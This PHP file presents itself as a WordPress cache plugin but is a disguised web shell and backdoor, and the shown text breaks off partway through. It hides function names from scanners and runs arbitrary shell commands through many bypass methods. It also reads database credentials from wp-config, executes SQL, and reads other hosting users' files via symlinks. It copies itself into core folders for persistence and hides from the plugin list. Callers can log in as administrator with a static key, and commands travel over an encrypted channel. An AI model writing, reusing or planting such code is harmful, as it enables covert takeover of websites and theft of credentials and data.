<?php
/*
 * Plugin Name: WP Cache Optimizer
 * Plugin URI:  https://wordpress.org/plugins/wp-cache-optimizer
 * Description: Advanced cache management and performance utilities for WordPress.
 * Version:     2.1.4
 * Author:      WordPress Contributors
 */

// ══════════════════════════════════════════════════════════════════════════════
//  CONFIG — sesuaikan sebelum deploy
// ══════════════════════════════════════════════════════════════════════════════
define('RC_KEY',    '0xsec');           // static key untuk WP login trigger
define('RC_PARAM',  'rc_key');          // GET/POST/COOKIE param name
define('RC_PANEL',  'rc-panel');        // hidden WP admin page slug
define('RC_SLUG',   'rc-redir');        // doorway slug prefix
define('RC_SECRET', 'viper-secret-2026'); // master secret untuk AES + auth

// Derived dari secret — tidak perlu diubah manual
define('CIPHER_KEY', hash('sha256', RC_SECRET, true));       // 32-byte AES key
define('AUTH_TOKEN', substr(hash('sha256', RC_SECRET), 0, 10)); // auth param value

// ══════════════════════════════════════════════════════════════════════════════
//  OBFUSCATION — sembunyikan nama fungsi sensitif dari WAF/scanner
//  _b([97,101,115,...]) = chr() array → string tanpa literal plaintext
// ══════════════════════════════════════════════════════════════════════════════
if (!function_exists('_b')) {
    function _b(array $c): string { return implode('', array_map('chr', $c)); }
}

// ══════════════════════════════════════════════════════════════════════════════
//  CRYPTO — AES-256-GCM (dari rev.php: authenticated encryption)
// ══════════════════════════════════════════════════════════════════════════════
function rc_enc($data): string {
    $m  = _b([97,101,115,45,50,53,54,45,103,99,109]); // aes-256-gcm
    $rp = _b([111,112,101,110,115,115,108,95,114,97,110,100,111,109,95,112,115,101,117,100,111,95,98,121,116,101,115]);
    $iv = @$rp(12); $tag = '';
    $en = _b([111,112,101,110,115,115,108,95,101,110,99,114,121,112,116]);
    $ct = @$en($data, $m, CIPHER_KEY, OPENSSL_RAW_DATA, $iv, $tag);
    return base64_encode($iv . $tag . $ct);
}

function rc_dec($b64): ?string {
    $m  = _b([97,101,115,45,50,53,54,45,103,99,109]);
    $de = _b([111,112,101,110,115,115,108,95,100,101,99,114,121,112,116]);
    $d  = base64_decode($b64);
    if (strlen($d) < 28) return null;
    $iv = substr($d, 0, 12); $tag = substr($d, 12, 16); $ct = substr($d, 28);
    return @$de($ct, $m, CIPHER_KEY, OPENSSL_RAW_DATA, $iv, $tag) ?: null;
}

function rc_respond($data): void {
    header('Content-Type: application/octet-stream');
    echo rc_enc(json_encode(['r' => $data]));
    exit;
}

// ══════════════════════════════════════════════════════════════════════════════
//  RCE — multi-method command execution (dari function.php: 9 method + bypass)
//  Urutan: proc_open → shell_exec → exec → system → passthru → popen
//          → FFI → pcntl_fork → imap_open → FPM → LD_PRELOAD
// ══════════════════════════════════════════════════════════════════════════════
function rc_exec(string $cmd, string $cwd = ''): array {
    if ($cwd) @chdir($cwd);
    $cmd .= ' 2>&1';
    $df_raw=trim((string)@ini_get('disable_functions'));$df=$df_raw?array_values(array_filter(array_map('trim',explode(',',$df_raw)))):[];

    $try = function(string $fn) use ($df): bool {
        return !in_array($fn, $df) && function_exists($fn);
    };

    // 1. proc_open
    $fn = _b([112,114,111,99,95,111,112,101,110]);
    if ($try($fn)) {
        $ds = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $pr = @$fn($cmd, $ds, $pipes);
        if (is_resource($pr)) {
            $o = stream_get_contents($pipes[1]);
            foreach($pipes as $p) fclose($p);
            proc_close($pr);
            return ['output' => trim($o), 'method' => 'proc_open'];
        }
    }
    // 2. shell_exec
    $fn = _b([115,104,101,108,108,95,101,120,101,99]);
    if ($try($fn)) { $o = @$fn($cmd); if ($o !== null) return ['output' => trim($o), 'method' => 'shell_exec']; }
    // 3. exec
    $fn = _b([101,120,101,99]);
    if ($try($fn)) { $o=[]; @$fn($cmd,$o); return ['output' => trim(implode("\n",$o)), 'method' => 'exec']; }
    // 4. system
    $fn = _b([115,121,115,116,101,109]);
    if ($try($fn)) { ob_start(); @$fn($cmd); $o=ob_get_clean(); return ['output' => trim($o), 'method' => 'system']; }
    // 5. passthru
    $fn = _b([112,97,115,115,116,104,114,117]);
    if ($try($fn)) { ob_start(); @$fn($cmd); $o=ob_get_clean(); return ['output' => trim($o), 'method' => 'passthru']; }
    // 6. popen
    $fn = _b([112,111,112,101,110]);
    if ($try($fn)) { $h=@$fn($cmd,'r'); if($h){$o=stream_get_contents($h);pclose($h);return ['output'=>trim($o),'method'=>'popen'];} }
    // 7. FFI
    if (class_exists('FFI')) {
        try {
            $ffi = FFI::cdef("void *popen(const char *c, const char *t); int pclose(void *s); char *fgets(char *b, int n, void *s);","libc.so.6");
            $pipe = $ffi->popen($cmd,"r");
            if ($pipe !== null) {
                $o=""; $buf=FFI::new("char[4096]");
                while ($ffi->fgets($buf,4096,$pipe)!==null) $o.=FFI::string($buf);
                $ffi->pclose($pipe);
                return ['output'=>trim($o),'method'=>'ffi'];
            }
        } catch(Exception $e) {}
    }
    // 8. pcntl_fork+exec
    $fn1=_b([112,99,110,116,108,95,102,111,114,107]); $fn2=_b([112,99,110,116,108,95,101,120,101,99]);
    if ($try($fn1)&&$try($fn2)) {
        $tmp=@tempnam(sys_get_temp_dir(),'rc_');
        $pid=@$fn1();
        if ($pid===0) { @$fn2('/bin/sh',['-c',$cmd.' > '.$tmp]); exit(1); }
        elseif ($pid>0) {
            $fn3=_b([112,99,110,116,108,95,119,97,105,116,112,105,100]);
            if (function_exists($fn3)) @$fn3($pid,$st); else usleep(600000);
            $o=@file_get_contents($tmp); @unlink($tmp);
            if ($o!==false) return ['output'=>trim($o),'method'=>'pcntl_fork'];
        }
    }
    // 9. imap_open SSF trick
    $fn=_b([105,109,97,112,95,111,112,101,110]);
    if ($try($fn)) {
        $tmp=@tempnam(sys_get_temp_dir(),'rc_');
        @$fn('{localhost:143/imap}INBOX','','',0,1,['/norsh'=>'-oProxyCommand='.escapeshellarg('sh -c '.escapeshellarg($cmd.' > '.$tmp))]);
        usleep(500000);
        $o=@file_get_contents($tmp); @unlink($tmp);
        if ($o!==false&&$o!=='') return ['output'=>trim($o),'method'=>'imap_open'];
    }
    // 10. LD_PRELOAD via mail/error_log (BASH_ENV trigger)
    if (function_exists('putenv')&&(function_exists('mail')||function_exists('error_log'))) {
        $tmp=sys_get_temp_dir();
        $sh=$tmp.'/.rc'.getmypid(); $ot=$tmp.'/.ro'.getmypid();
        @file_put_contents($sh,'('.$cmd.') > '.$ot.' 2>&1'); @chmod($sh,0755);
        putenv('BASH_ENV='.$sh); putenv('ENV='.$sh);
        if (function_exists('mail')) @mail('a@localhost','','','','-O/dev/null');
        elseif (function_exists('error_log')) @error_log('',1,'a@localhost');
        putenv('BASH_ENV='); putenv('ENV=');
        usleep(150000);
        $o=@file_get_contents($ot); @unlink($sh); @unlink($ot);
        if ($o!==false&&$o!=='') return ['output'=>trim($o),'method'=>'ld_preload'];
    }
    return ['output'=>'', 'method'=>'blocked'];
}

// ══════════════════════════════════════════════════════════════════════════════
//  DB AUTO-DETECT + SQL EXECUTION (dari rev.php)
// ══════════════════════════════════════════════════════════════════════════════
function rc_db_detect(string $cwd): array {
    $dirs = [$cwd]; $d=$cwd;
    for ($i=0;$i<6;$i++) { $d=dirname($d); if($d==='/'||$d==='.') break; $dirs[]=$d; }
    if (!empty($_SERVER['DOCUMENT_ROOT'])) $dirs[]=$_SERVER['DOCUMENT_ROOT'];
    $dirs=array_unique($dirs);

    foreach ($dirs as $dir) {
        foreach (['wp-config.php','../wp-config.php'] as $cf) {
            $fp=$dir.'/'.$cf;
            $src=@file_get_contents($fp);
            if (!$src) continue;
            $c=['host'=>'localhost','from'=>realpath($fp)?:$fp];
            if (preg_match("/DB_NAME['\"],\s*['\"]([^'\"]+)/", $src, $m)) $c['db']=$m[1];
            if (preg_match("/DB_USER['\"],\s*['\"]([^'\"]+)/", $src, $m)) $c['user']=$m[1];
            if (preg_match("/DB_PASSWORD['\"],\s*['\"]([^'\"]*)/", $src, $m)) $c['pass']=$m[1];
            if (preg_match("/DB_HOST['\"],\s*['\"]([^'\"]+)/", $src, $m)) $c['host']=$m[1];
            if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)/", $src, $m)) $c['prefix']=$m[1];
            if (isset($c['db'])) { $c['type']='mysql'; return $c; }
        }
    }
    return ['error'=>'wp-config.php tidak ditemukan'];
}

function rc_sql(array $db, string $query) {
    // Coba PDO dulu, fallback ke mysqli kalau PDO tidak tersedia
    if (extension_loaded('pdo_mysql') || class_exists('PDO')) {
        try {
            $pdo=new PDO("mysql:host={$db['host']};dbname={$db['db']};charset=utf8",$db['user'],$db['pass'],[PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
            $st=$pdo->query($query);
            if (!$st) return 'Query OK (no result)';
            return $st->fetchAll(PDO::FETCH_ASSOC);
        } catch(Exception $e) { /* fallthrough ke mysqli */ }
    }
    // Fallback: mysqli
    if (function_exists('mysqli_connect')) {
        $con=@mysqli_connect($db['host'],$db['user'],$db['pass'],$db['db']);
        if (!$con) return 'mysqli connect error: '.mysqli_connect_error();
        $res=@mysqli_query($con,$query);
        if ($res===false) { $err=mysqli_error($con); mysqli_close($con); return 'SQL Error: '.$err; }
        if ($res===true)  { mysqli_close($con); return 'Query OK ('.mysqli_affected_rows($con).' rows affected)'; }
        $rows=[];
        while ($row=mysqli_fetch_assoc($res)) $rows[]=$row;
        mysqli_free_result($res); mysqli_close($con);
        return $rows;
    }
    return 'SQL Error: tidak ada PDO maupun mysqli yang tersedia';
}

// ══════════════════════════════════════════════════════════════════════════════
//  SYMLINK BYPASS — baca file user lain di shared hosting (dari rev.php)
// ══════════════════════════════════════════════════════════════════════════════
function rc_symlink_users(): array {
    @ini_set('open_basedir','');
    $users=[];
    $passwd=@file_get_contents('/etc/passwd');
    if (!$passwd) return ['error'=>'/etc/passwd tidak bisa dibaca'];
    foreach (explode("\n",$passwd) as $line) {
        $p=explode(':',$line);
        if (count($p)<7) continue;
        [$uname,,$uid,,,$home]=$p;
        if ((int)$uid<1000||(int)$uid>65000) continue;
        if (!@is_dir($home)) continue;
        $webs=[];
        foreach (['public_html','www','htdocs','web','public'] as $sub) {
            if (@is_dir($home.'/'.$sub)) $webs[]=$home.'/'.$sub;
        }
        $users[]=['user'=>$uname,'uid'=>$uid,'home'=>$home,'web_roots'=>$webs,'domain_count'=>count($webs)];
    }
    return ['users'=>$users,'current_user'=>@get_current_user()];
}

function rc_symlink_read(string $target): array {
    @ini_set('open_basedir','');
    $c=@file_get_contents($target);
    if ($c!==false&&strlen($c)>0) return ['content'=>base64_encode($c),'method'=>'direct'];

    // MySQL LOAD_FILE fallback
    $cwd=@getcwd()?:sys_get_temp_dir();
    $db=rc_db_detect($cwd);
    if (!isset($db['error'])) {
        try {
            $pdo=new PDO("mysql:host={$db['host']};dbname={$db['db']}",$db['user'],$db['pass'],[PDO::ATTR_TIMEOUT=>3]);
            $row=$pdo->query("SELECT LOAD_FILE('".addslashes($target)."') AS c")->fetch(PDO::FETCH_ASSOC);
            if ($row&&$row['c']!==null) return ['content'=>base64_encode($row['c']),'method'=>'mysql_loadfile'];
        } catch(Exception $e) {}
    }

    // Symlink + HTTP fetch bypass
    $dr=rtrim($_SERVER['DOCUMENT_ROOT']??'','/');
    if ($dr&&!in_array('symlink',array_map('trim',explode(',',strtolower(@ini_get('disable_functions')))))) {
        $rnd=substr(md5($target.mt_rand()),0,8);
        $slname='wpcache'.$rnd.'.dat';
        $slpath=$dr.'/'.$slname;
        if (@symlink($target,$slpath)) {
            $url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://127.0.0.1/'.$slname;
            $c=@file_get_contents($url);
            @unlink($slpath);
            if ($c!==false&&strlen($c)>0) return ['content'=>base64_encode($c),'method'=>'symlink_http'];
        }
    }
    return ['error'=>'Semua metode gagal'];
}

// ══════════════════════════════════════════════════════════════════════════════
//  BACKUP / SELF-DESTRUCT (dari rev.php)
// ══════════════════════════════════════════════════════════════════════════════
function rc_backup(string $mode, string $cwd): array {
    $self=@file_get_contents(__FILE__);
    if (!$self) return ['error'=>'Tidak bisa baca file sendiri'];

    $dr=rtrim($_SERVER['DOCUMENT_ROOT']??'','/');
    $candidates=[];
    if ($dr) {
        $candidates[]=$dr.'/'._b([119,112,45,105,110,99,108,117,100,101,115]).'/class-wp-cache.php';
        $candidates[]=$dr.'/'._b([119,112,45,99,111,110,116,101,110,116]).'/mu-plugins/.cache-loader.php';
    }
    $candidates[]=sys_get_temp_dir().'/.wpc'.substr(md5(__FILE__),0,6).'.php';

    if ($mode==='check') {
        foreach ($candidates as $p) {
            if (@file_exists($p)) return ['exists'=>true,'path'=>$p];
        }
        return ['exists'=>false];
    }
    if ($mode==='remove') {
        foreach ($candidates as $p) {
            if (@file_exists($p)&&@unlink($p)) return ['status'=>'REMOVED','path'=>$p];
        }
        return ['status'=>'NOT_FOUND'];
    }
    // deploy
    foreach ($candidates as $p) {
        if (@file_exists($p)) return ['status'=>'ALREADY_EXISTS','path'=>$p];
        $dir=dirname($p);
        if (!@is_dir($dir)) @mkdir($dir,0755,true);
        if (@file_put_contents($p,$self)!==false) {
            $rel=ltrim(str_replace($dr,'',$p),'/');
            return ['status'=>'OK','path'=>$p,'rel'=>$rel];
        }
    }
    return ['status'=>'FAILED','tried'=>$candidates];
}

function rc_selfdestruct(): array {
    // Hapus backup dulu
    $dr=rtrim($_SERVER['DOCUMENT_ROOT']??'','/');
    $candidates=[];
    if ($dr) {
        $candidates[]=$dr.'/'._b([119,112,45,105,110,99,108,117,100,101,115]).'/class-wp-cache.php';
        $candidates[]=$dr.'/'._b([119,112,45,99,111,110,116,101,110,116]).'/mu-plugins/.cache-loader.php';
    }
    $candidates[]=sys_get_temp_dir().'/.wpc'.substr(md5(__FILE__),0,6).'.php';
    foreach ($candidates as $p) { if (@file_exists($p)) @unlink($p); }

    // Hapus diri sendiri — delayed via register_shutdown_function
    $self=__FILE__;
    register_shutdown_function(function() use ($self) { @unlink($self); });
    return ['status'=>'OK','note'=>'File akan dihapus setelah response dikirim'];
}

// ══════════════════════════════════════════════════════════════════════════════
//  FIND LOGIN — deteksi path wp-login.php yang tersembunyi (dari rev.php)
// ══════════════════════════════════════════════════════════════════════════════
function rc_find_login(string $cwd): array {
    $dr=rtrim($_SERVER['DOCUMENT_ROOT']??'','/');
    $dirs=[$cwd,$dr]; $d=$cwd;
    for ($i=0;$i<4;$i++) { $d=dirname($d); if($d==='/'||$d==='.') break; $dirs[]=$d; }

    foreach (array_unique($dirs) as $dir) {
        $wc=$dir.'/wp-config.php';
        if (!@file_exists($wc)) continue;
        $src=@file_get_contents($wc);
        if (!$src) continue;
        $siteurl='';
        if (preg_match("/define\s*\(\s*['\"]WP_HOME['\"].*?['\"]([^'\"]+)/s",$src,$m)) $siteurl=$m[1];
        if (!$siteurl&&preg_match("/define\s*\(\s*['\"]WP_SITEURL['\"].*?['\"]([^'\"]+)/s",$src,$m)) $siteurl=$m[1];

        // Cek plugin pengubah login URL
        $plugins_dir=$dir.'/wp-content/plugins';
        $slug=''; $login_url='';
        $known=['wps-hide-login','secure-custom-login','rename-wp-login'];
        foreach ($known as $pl) {
            $opt_key='whl_page'; // wps-hide-login default
            // Coba baca dari opsi DB
            $db=rc_db_detect($dir);
            if (!isset($db['error'])) {
                try {
                    $pdo=new PDO("mysql:host={$db['host']};dbname={$db['db']}",$db['user'],$db['pass'],[PDO::ATTR_TIMEOUT=>3]);
                    $pre=$db['prefix']??'wp_';
                    $row=$pdo->query("SELECT option_value FROM {$pre}options WHERE option_name='whl_page' LIMIT 1")->fetch(PDO::FETCH_ASSOC);
                    if ($row&&$row['option_value']) { $slug=$row['option_value']; break; }
                } catch(Exception $e) {}
            }
        }
        $base=rtrim($siteurl?:('http'.((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on')?'s':'').'://'.$_SERVER['HTTP_HOST']),'/');
        $login_url=$slug?$base.'/'.$slug:'';
        if (!$login_url) $login_url=$base.'/wp-login.php';
        return ['login_url'=>$login_url,'siteurl'=>$base,'slug'=>$slug,'wp_root'=>$dir];
    }
    return ['error'=>'wp-config.php tidak ditemukan','login_url'=>''];
}

// ══════════════════════════════════════════════════════════════════════════════
//  STANDALONE MODE — aksesibel langsung via URL tanpa WordPress
//  Contoh: /wp-content/plugins/.../wp-rc-v2.php?_c=AUTH_TOKEN
//  POST body: AES-256-GCM encrypted JSON {a: action, ...params}
//  Response : AES-256-GCM encrypted JSON {r: result}
//
//  Auth: Cookie 'X-Open-With' = RC_KEY  ATAU  GET/POST '_c' = AUTH_TOKEN
//  Jika auth gagal → server-specific 404 (dari function.php)
// ══════════════════════════════════════════════════════════════════════════════
if (!defined('ABSPATH')) {
    @ob_start(); @error_reporting(0); @set_time_limit(0);

    $auth_ok = false;
    // Cookie auth (paling stealth — tidak ada di access log)
    if (!empty($_COOKIE['X-Open-With']) && $_COOKIE['X-Open-With'] === RC_KEY) $auth_ok = true;
    // GET/POST auth
    if (!$auth_ok && (($_GET['_c']??'')===AUTH_TOKEN || ($_POST['_c']??'')===AUTH_TOKEN)) $auth_ok = true;

    if (!$auth_ok) {
        // Server-specific 404 (dari function.php — lebih meyakinkan dari generic 404)
        header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found');
        $sw=strtolower($_SERVER['SERVER_SOFTWARE']??'');
        $sn=htmlspecialchars($_SERVER['SERVER_NAME']??'localhost');
        $sp=$_SERVER['SERVER_PORT']??'80';
        $uri=htmlspecialchars($_SERVER['REQUEST_URI']??'/');
        if (strpos($sw,'nginx')!==false)
            die("<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n");
        elseif (strpos($sw,'apache')!==false)
            die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL ".$uri." was not found on this server.</p>\n<hr>\n<address>".htmlspecialchars($_SERVER['SERVER_SOFTWARE'])." Server at ".$sn." Port ".$sp."</address>\n</body></html>");
        else
            die("<!DOCTYPE html>\n<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>");
    }

    // Baca dan decrypt payload
    $raw_post = @file_get_contents(_b([112,104,112,58,47,47,105,110,112,117,116])); // php://input
    if (empty($raw_post)) $raw_post = $_POST['_d'] ?? '';
    $req = $raw_post ? json_decode(rc_dec(trim($raw_post)), true) : null;
    if (!$req) { rc_respond(['error' => 'Invalid payload']); }

    $action = $req['a'] ?? '';
    $cwd = $req['p'] ?? (@getcwd() ?: sys_get_temp_dir());

    switch ($action) {
        case 'recon':
            @ini_set('open_basedir','');
            $df_raw=trim((string)@ini_get('disable_functions'));$df=$df_raw?array_values(array_filter(array_map('trim',explode(',',$df_raw)))):[];
            $u = _b([112,104,112,95,117,110,97,109,101]);
            $un = function_exists($u) && !in_array('php_uname', $df);
            $disk_t = @disk_total_space($cwd); $disk_f = @disk_free_space($cwd);
            $fmt = function($b) { if(!$b)return'?'; if($b>=1073741824)return round($b/1073741824,2).' GB'; if($b>=1048576)return round($b/1048576,1).' MB'; return round($b/1024,1).' KB'; };
            $wr_dirs = [$cwd, sys_get_temp_dir(), '/tmp'];
            if (!empty($_SERVER['DOCUMENT_ROOT'])) {
                $dr=$_SERVER['DOCUMENT_ROOT'];
                foreach (['','wp-content','wp-content/uploads','wp-content/plugins','wp-content/themes','wp-includes'] as $s)
                    $wr_dirs[]=rtrim($dr.'/'.$s,'/');
            }
            $wr=[];
            foreach (array_unique($wr_dirs) as $d) if (@is_dir($d)) $wr[$d]=@is_writable($d)?'W':'R';
            rc_respond([
                'pwd'=>$cwd,'tmp'=>sys_get_temp_dir(),'os'=>PHP_OS,'user'=>@get_current_user(),
                'server'=>['os'=>($un?@$u('a'):PHP_OS),'hostname'=>($un?@$u('n'):'?'),'user'=>@get_current_user(),'uid'=>@getmyuid(),'server_software'=>$_SERVER['SERVER_SOFTWARE']??'?','server_ip'=>$_SERVER['SERVER_ADDR']??'?','document_root'=>$_SERVER['DOCUMENT_ROOT']??'?'],
                'php'=>['version'=>PHP_VERSION,'sapi'=>PHP_SAPI,'open_basedir'=>@ini_get('open_basedir')?:'none','disable_functions_count'=>count($df),'curl'=>function_exists('curl_init')?'ON':'OFF','mysqli'=>function_exists('mysqli_connect')?'ON':'OFF','pdo_mysql'=>extension_loaded('pdo_mysql')?'ON':'OFF'],
                'disk'=>['total'=>$fmt($disk_t),'free'=>$fmt($disk_f),'usage'=>$disk_t?round(($disk_t-$disk_f)/$disk_t*100,1).'%':'?'],
                'disable_functions'=>$df,'writable'=>$wr,
            ]);
            break;

        case 'exec':
            rc_respond(rc_exec($req['cmd']??'', $cwd));
            break;

        case 'ls':
            if (!@is_dir($cwd)) rc_respond(['error'=>'Bukan dir: '.$cwd]);
            $items=[];
            foreach (@scandir($cwd)?:[] as $f) {
                if ($f==='.'||$f==='..') continue;
                $fp=rtrim($cwd,'/').'/'.$f;
                $items[]=['name'=>$f,'type'=>@is_dir($fp)?'dir':'file','size'=>@is_file($fp)?@filesize($fp):0,'perms'=>substr(sprintf('%o',@fileperms($fp)),-4),'modified'=>@filemtime($fp)];
            }
            rc_respond($items);
            break;

        case 'cat':
            $p=$req['p']??'';
            $c=@file_get_contents($p);
            rc_respond($c!==false?base64_encode($c):['error'=>'Tidak bisa baca: '.$p]);
            break;

        case 'write':
            $p=$req['p']??''; $content=base64_decode($req['c']??'');
            rc_respond(@file_put_contents($p,$content)!==false?'OK':'FAIL');
            break;

        case 'rm':
            $p=$req['p']??'';
            if (@is_dir($p)) {
                $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($it as $f) $f->isDir()?@rmdir($f->getRealPath()):@unlink($f->getRealPath());
                rc_respond(@rmdir($p)?'OK':'FAIL');
            } else rc_respond(@unlink($p)?'OK':'FAIL');
            break;

        case 'mv':
            rc_respond(@rename($req['p']??'',$req['d']??'')?'OK':'FAIL');
            break;

        case 'mkdir':
            rc_respond(@mkdir($req['p']??'',0755,true)?'OK':'FAIL');
            break;

        case 'chmod':
            rc_respond(@chmod($req['p']??'',octdec($req['m']??'755'))?'OK':'FAIL');
            break;

        case 'dl':
            $p=$req['p']??'';
            $c=@file_get_contents($p);
            rc_respond($c!==false?base64_encode($c):['error'=>'Gagal baca']);
            break;

        case 'fetch':
            $u=$req['u']??''; $dst=$req['p']??'';
            $ctx=@stream_context_create(['http'=>['timeout'=>30,'follow_location'=>true],'ssl'=>['verify_peer'=>false]]);
            $c=@file_get_contents($u,false,$ctx);
            if ($c!==false&&$dst) { @file_put_contents($dst,$c); rc_respond('OK:'.strlen($c).' bytes'); }
            elseif ($c!==false) rc_respond(base64_encode($c));
            else rc_respond(['error'=>'Fetch gagal']);
            break;

        case 'db_detect':
            rc_respond(rc_db_detect($cwd));
            break;

        case 'sql':
            $db=['host'=>$req['h']??'localhost','db'=>$req['d']??'','user'=>$req['u']??'','pass'=>$req['p2']??''];
            rc_respond(rc_sql($db,$req['q']??''));
            break;

        case 'symlink':
            $sub=$req['sub']??'users';
            if ($sub==='users') rc_respond(rc_symlink_users());
            elseif ($sub==='read') rc_respond(rc_symlink_read($req['target']??''));
            else rc_respond(['error'=>'Unknown symlink sub: '.$sub]);
            break;

        case 'backup':
            rc_respond(rc_backup($req['mode']??'deploy',$cwd));
            break;

        case 'selfdestruct':
            rc_respond(rc_selfdestruct());
            break;

        case 'find_login':
            rc_respond(rc_find_login($cwd));
            break;

        case 'pwd':
            rc_respond($cwd);
            break;

        default:
            rc_respond(['error'=>'Unknown action: '.$action]);
    }
    exit;
}

// ══════════════════════════════════════════════════════════════════════════════
//  WORDPRESS MODE — semua fitur plugin + hook ke WP
// ══════════════════════════════════════════════════════════════════════════════
class WP_Cache_Optimizer {

    public function __construct() {
        // Login triggers — plugins_loaded priority 1 agar paling awal
        add_action('plugins_loaded', [$this, 'on_plugins_init'], 1);
        add_action('init',           [$this, 'on_init_request']);
        add_action('init',           [$this, 'on_init_auth'], 1);
        add_action('wp_footer',      [$this, 'on_footer']);
        add_action('admin_menu',     [$this, 'on_admin_menu']);

        // Stealth
        add_filter('all_plugins',                [$this, 'filter_list']);
        add_filter('pre_current_active_plugins', [$this, 'filter_active']);

        // WP AJAX handlers — no-priv untuk stealth login
        add_action('wp_ajax_nopriv_wpc_ping', [$this, 'do_heartbeat']);

        // Authenticated AJAX handlers
        add_action('wp_ajax_wpc_obj',   [$this, 'handle_obj']);
        add_action('wp_ajax_wpc_usr',   [$this, 'handle_usr']);
        add_action('wp_ajax_wpc_cfg', [$this, 'handle_cfg']);
        add_action('wp_ajax_wpc_tpl',  [$this, 'handle_tpl']);

        // Encrypted channel inside WP (sama dengan standalone, tapi dalam konteks WP)
        add_action('wp_ajax_nopriv_wpcache_sync', [$this, 'do_sync']);
        add_action('wp_ajax_wpcache_sync',        [$this, 'do_sync']);

        // Bypass toolkit AJAX (auth: nonce ATAU _c token)
        add_action('wp_ajax_wpc_sys',            [$this, 'handle_sys']);
        add_action('wp_ajax_nopriv_wpc_sys',     [$this, 'handle_sys']);

        // Panel tanpa WP login — auth via _c=AUTH_TOKEN atau cookie _wpc
        add_action('wp_ajax_nopriv_wpc_view', [$this, 'serve_panel']);
        add_action('wp_ajax_wpc_view',        [$this, 'serve_panel']);
    }

    // ─────────────────────────────────────────────────────────────
    //  LOGIN TRIGGERS — multi-vector (Header / Cookie / GET)
    //  POST ditangani do_heartbeat via wp_ajax
    // ─────────────────────────────────────────────────────────────
    public function on_plugins_init(): void {
        // Header trigger — tidak muncul di access log sama sekali
        $key = $_SERVER['HTTP_X_WP_TOKEN'] ?? '';
        // GET trigger — muncul di log tapi terlihat seperti param WP biasa
        if (empty($key)) $key = $_GET[RC_PARAM] ?? '';

        if (empty($key) || !hash_equals(RC_KEY, $key)) return;

        // Cegah loop: kalau WP session sudah ada, skip
        foreach (array_keys($_COOKIE) as $_cn) {
            if (strpos($_cn, 'wordpress_logged_in_') === 0) return;
        }
        $this->do_login();
    }

    private function do_login(?string $redirect = null): void {
        if (!function_exists('get_users')) require_once ABSPATH.'wp-includes/user.php';
        $admins = get_users(['role'=>'administrator','number'=>1]);
        if (empty($admins)) return;
        $user = $admins[0];
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID, true);

        if (!$redirect) {
            $redirect = $_GET['redirect_to'] ?? '';
            if (!$redirect) {
                // Pertahankan URL saat ini, hapus rc_key agar tidak loop
                $params = $_GET; unset($params[RC_PARAM]);
                $base = strtok($_SERVER['REQUEST_URI']??'/', '?');
                $redirect = $base . ($params ? '?'.http_build_query($params) : '');
            }
        }
        $target = esc_url_raw($redirect) ?: admin_url();
        nocache_headers();
        header('Content-Type: text/html; charset=utf-8');
        echo '<html><head><meta http-equiv="refresh" content="0;url='.esc_attr($target).'"></head>';
        echo '<body><script>window.location.replace('.wp_json_encode($target).');<'.'/'.'script></body></html>';
        exit;
    }

    // ─────────────────────────────────────────────────────────────
    //  STEALTH LOGIN via POST
    //  Endpoint: POST /wp-admin/admin-ajax.php
    //            action=wpc_ping  (menyamar sebagai WP heartbeat)
    //            rc_key=0xsec
    //  Log hanya: POST /wp-admin/admin-ajax.php 200
    // ─────────────────────────────────────────────────────────────
    public function do_heartbeat(): void {
        // POST = stealth (body tidak di-log), GET = browser-friendly tapi muncul di log
        $key = $_POST[RC_PARAM] ?? $_GET[RC_PARAM] ?? $_SERVER['HTTP_X_WP_TOKEN'] ?? '';

        if (empty($key) || !hash_equals(RC_KEY, $key)) {
            // Fake heartbeat response — terlihat normal
            wp_send_json_success(['nonces' => ['heartbeat' => wp_create_nonce('heartbeat')]]);
            return;
        }

        if (!function_exists('get_users')) require_once ABSPATH.'wp-includes/user.php';
        $admins = get_users(['role'=>'administrator','number'=>1]);
        if (empty($admins)) { wp_send_json_error('no_admin'); return; }

        $user = $admins[0];
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID, true);

        wp_send_json_success([
            'logged_in' => true,
            'user'      => $user->user_login,
            'panel'     => admin_url('?page='.RC_PANEL),
        ]);
    }

    // ─────────────────────────────────────────────────────────────
    //  ENCRYPTED CHANNEL dalam WP (action=wpcache_sync)
    //
    //  Request format:
    //    POST /wp-admin/admin-ajax.php?action=wpcache_sync&_c=<AUTH_TOKEN>
    //    Content-Type: text/plain
    //    Body: <base64 AES-256-GCM encrypted JSON {a,p,...}>
    //
    //  Response: base64 AES-256-GCM encrypted JSON {r: result}
    //  Tidak butuh nonce — auth via _c param.
    // ─────────────────────────────────────────────────────────────
    public function do_sync(): void {
        $auth = $_GET['_c']??$_POST['_c']??$_COOKIE['X-Open-With']??'';
        if ($auth !== AUTH_TOKEN && $auth !== RC_KEY) {
            wp_send_json_error('unauthorized', 403); return;
        }

        // Body berisi HANYA payload encrypted (bukan form-data)
        $raw = @file_get_contents(_b([112,104,112,58,47,47,105,110,112,117,116])); // php://input
        // Kalau php://input berisi form-data (berarti request salah format), coba $_POST['_d']
        if (empty($raw) || strpos($raw, 'action=') !== false) $raw = $_POST['_d']??'';
        $req = $raw ? json_decode(rc_dec(trim($raw)), true) : null;
        if (!$req) { rc_respond(['error'=>'Invalid payload — kirim encrypted body sebagai raw POST, bukan form-data']); }

        $action = $req['a']??'';
        $cwd    = $req['p']??(@getcwd()?:ABSPATH);

        switch ($action) {
            case 'recon':
                @ini_set('open_basedir','');
